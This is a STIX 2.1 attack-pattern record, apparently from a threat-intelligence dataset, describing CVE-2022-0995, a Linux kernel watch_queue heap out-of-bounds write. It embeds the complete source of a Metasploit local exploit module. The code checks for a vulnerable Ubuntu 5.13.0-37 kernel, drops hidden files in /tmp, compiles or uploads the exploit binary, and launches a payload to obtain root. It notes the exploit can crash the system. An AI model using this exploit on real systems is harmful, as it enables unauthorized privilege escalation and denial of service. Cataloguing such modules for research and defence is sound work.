{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2dc588f-d642-4948-931b-0d1d33df071c",
    "created": "2024-08-14T16:59:11.215516Z",
    "modified": "2024-08-14T16:59:11.215519Z",
    "name": "Watch Queue Out of Bounds Write",
    "description": " This module exploits a vulnerability in the Linux Kernel's watch_queue event notification system. It relies on a heap out-of-bounds write in kernel memory. The exploit may fail on the first attempt so multiple attempts may be needed. Note that the exploit can potentially cause a denial of service if multiple failed attemps occur, however this is unlikely.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2022_0995_watch_queue.rb",
            "external_id": "cve_2022_0995_watch_queue.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-0995"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Bonfee/CVE-2022-0995"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0995"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Compile\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Watch Queue Out of Bounds Write',\n        'Description' => %q{\n          This module exploits a vulnerability in the Linux Kernel's watch_queue event\n          notification system. It relies on a heap out-of-bounds write in kernel memory.\n          The exploit may fail on the first attempt so multiple attempts may be needed.\n          Note that the exploit can potentially cause a denial of service if multiple\n          failed attemps occur, however this is unlikely.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jann Horn', # discovery and poc\n          'bonfee',     # PoC\n          'bwatters-r7' # Aka @tychos_moose, Metasploit Module\n        ],\n        'DisclosureDate' => '2022-03-14',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2022-0995' ],\n          [ 'URL', 'https://github.com/Bonfee/CVE-2022-0995' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb' ],\n          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-0995' ],\n          [ 'PACKETSTORM', '166770' ],\n        ],\n        'Targets' => [\n          [ 'Ubuntu Linux 5.13.0-37', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [ UNRELIABLE_SESSION ], # Not expected to get a shell every time due to heap spray sometimes not working.\n          'Stability' => [ CRASH_OS_DOWN ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options [\n      OptBool.new('DEBUG_SOURCE', [ false, 'Use source code with debug prints to help troubleshoot', false ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def pull_version\n    kernel_data = kernel_release\n    version_array = kernel_data.split('-')\n    if version_array.length < 3\n      print_error(\"Failed to parse the kernel version data: #{kernel_data}\")\n      return nil\n    end\n    vprint_status(\"Version array: #{version_array}\")\n    major_version = Rex::Version.new(version_array[0])\n    vprint_status(\"major_version: #{major_version}\")\n    minor_version = version_array[1].strip unless version_array[1].nil?\n    vprint_status(\"minor_version: #{minor_version}\")\n    kernel_type = version_array[2].strip unless version_array[2].nil?\n    return [major_version, minor_version, kernel_type]\n  end\n\n  def module_check\n    # Vulnerable versions are under 5.17:rc8\n    # This module only has offsets for Ubuntu 5.13.0-37\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n    if datastore['DEBUG_SOURCE'] && datastore['COMPILE'] != 'True'\n      fail_with(Failure::BadConfig, 'DEBUG_PRINT is only supported when COMPILE is set to True')\n    end\n    unless kernel_version =~ /[uU]buntu/\n      fail_with(Failure::NoTarget, \"Unsupported Distro: '#{version}'\")\n    end\n    arch = kernel_hardware\n    unless arch.include?('x86_64')\n      fail_with(Failure::NoTarget, \"Unsupported architecture: '#{arch}'\")\n    end\n    version_info = pull_version\n    if version_info.nil?\n      fail_with(Failure::NoTarget, 'Failed to obtain kernel version')\n    end\n    major_version, minor_version, kernel_type = version_info\n    vulnerable_version = Rex::Version.new('5.13.0')\n    unless major_version == vulnerable_version && minor_version == '37' && kernel_type.include?('generic')\n      fail_with(Failure::NoTarget, \"No offsets for '#{kernel_release}'\")\n    end\n  end\n\n  def check\n    # Vulnerable versions are under 5.17:rc8\n    # This module only has offsets for 5.13.0-37\n    vulnerable_version = Rex::Version.new('5.17.0')\n    version_info = pull_version\n    if version_info.nil?\n      return CheckCode::Unknown('Failed to obtain kernel version')\n    end\n\n    major_version = version_info[0]\n    if major_version <= vulnerable_version\n      return CheckCode::Appears\n    else\n      return CheckCode::Safe(\"The target kernel version #{major_version} is later than the last known vulnerable version aka #{vulnerable_version}\")\n    end\n  end\n\n  def exploit\n    module_check\n    base_dir = datastore['WritableDir'].to_s\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    exploit_dir = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    exploit_path = \"#{exploit_dir}/#{executable_name}\"\n    if file_exist?(exploit_dir)\n      fail_with(Failure::BadConfig, 'Exploit dir already exists')\n    end\n    mkdir(exploit_dir)\n    register_dir_for_cleanup(exploit_dir)\n\n    # Upload exploit\n    if live_compile?\n      vprint_status('Live compiling exploit on system...')\n      if datastore['DEBUG_SOURCE']\n        code = exploit_source('cve-2022-0995', 'cve-2022-0995_debug.c')\n      else\n        code = exploit_source('cve-2022-0995', 'cve-2022-0995.c')\n      end\n      upload_and_compile(exploit_path, code, '-no-pie -static')\n    else\n      vprint_status('Dropping pre-compiled exploit on system...')\n      precompiled_binary = 'cve-2022-0995.x64.elf'\n      vprint_status(\"Dropping pre-compiled exploit #{precompiled_binary} on system...\")\n      upload_and_chmodx(exploit_path, exploit_data('cve-2022-0995', precompiled_binary))\n    end\n\n    register_file_for_cleanup(exploit_path)\n\n    # Upload payload\n    payload_path = \"#{exploit_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx(payload_path, generate_payload_exe)\n\n    # Launch exploit\n    print_status('Launching exploit...')\n    cmd_string = \"#{exploit_path} #{payload_path}\"\n    vprint_status(\"Running: #{cmd_string}\")\n    begin\n      output = cmd_exec(cmd_string)\n      vprint_status(output)\n    rescue Error => e\n      elog('Caught timeout. Exploit may be taking longer or it may have failed.', error: e)\n      print_error(\"Exploit failed: #{e}\")\n      print_error(\"Ensure deletion of #{exploit_path} and #{payload_path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-03-14",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}